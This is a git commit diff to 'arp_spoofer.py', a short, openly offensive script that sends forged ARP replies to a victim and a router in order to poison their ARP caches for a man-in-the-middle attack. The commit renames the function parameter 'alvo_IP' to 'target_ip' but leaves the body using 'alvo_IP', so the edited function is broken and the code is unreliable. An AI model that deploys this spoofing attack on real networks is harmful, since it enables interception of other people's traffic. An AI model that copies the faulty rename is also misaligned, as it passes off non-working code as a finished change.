923abab509cf793615722f252299e96ff6ce7d48
C0D3 <121504471+Code583@users.noreply.github.com>
2026-01-15 22:41:44 -0300

    arp_spoofer.py

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -4,7 +4,7 @@ from time import sleep
 router_IP = "Enter the root IP"
 victim_IP = "Enter the victim IP"
 
-def spoofing(alvo_IP, fake_IP):
+def spoofing(target_ip, fake_IP):
     PKT = ARP(op=2, pdst=alvo_IP, psrc=fake_IP)
     send(PKT, verbose=False)
 
@@ -16,4 +16,5 @@ try:
 
         sleep(2)
 except KeyboardInterrupt:
+
     print("Stopping the attack")
